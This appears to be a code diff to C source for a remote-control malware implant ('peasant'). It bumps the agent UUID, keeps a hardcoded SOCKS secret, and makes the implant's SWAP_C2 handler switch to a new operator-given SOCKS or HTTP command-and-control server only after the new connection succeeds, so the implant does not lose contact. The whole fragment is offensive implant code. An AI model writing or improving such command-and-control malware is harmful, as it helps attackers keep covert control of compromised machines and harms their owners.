@@ -7,7 +7,7 @@
 #include "commands.h"
 #include "c2.h"
 #include "crypter.h"
-#define UUID "peasant1"
+#define UUID "peasant2"
 #define SOCKS_SECRET "VERYSECRET1337"
 
 int main(){
@@ -62,7 +62,6 @@ int main(){
                 }else if(mnem == SWAP_C2){
                     void** tmprx = conn->cryptRx;
                     void** tmptx = conn->cryptTx;
-                    cleanC2(*conn);
                     unsigned int code = popint(&sp);
                     
                     if(code == SOCKS){
@@ -70,15 +69,21 @@ int main(){
                         unsigned int port = popint(&sp);
                         unsigned int poll = popint(&sp);
                         C2* conn2 = newC2(SOCKS, UUID, SOCKS_SECRET, ip.data, port, poll);
-                        memcpy(conn, conn2, sizeof(C2));
-                        free(conn2);
+                        if(conn2 != NULL){
+                            cleanC2(*conn);
+                            memcpy(conn, conn2, sizeof(C2));
+                            free(conn2);
+                        }
                         fs(ip);
                     }else if(code == HTTP){
                         String ip = popstr(&sp);
                         unsigned int poll = popint(&sp);
                         C2* conn2 = newC2(HTTP, UUID, ip.data, poll);
-                        memcpy(conn, conn2, sizeof(C2));
-                        free(conn2);
+                        if(conn2 != NULL){
+                            cleanC2(*conn);
+                            memcpy(conn, conn2, sizeof(C2));
+                            free(conn2);
+                        }
                         fs(ip);
                     }
                     conn->cryptRx = tmprx;
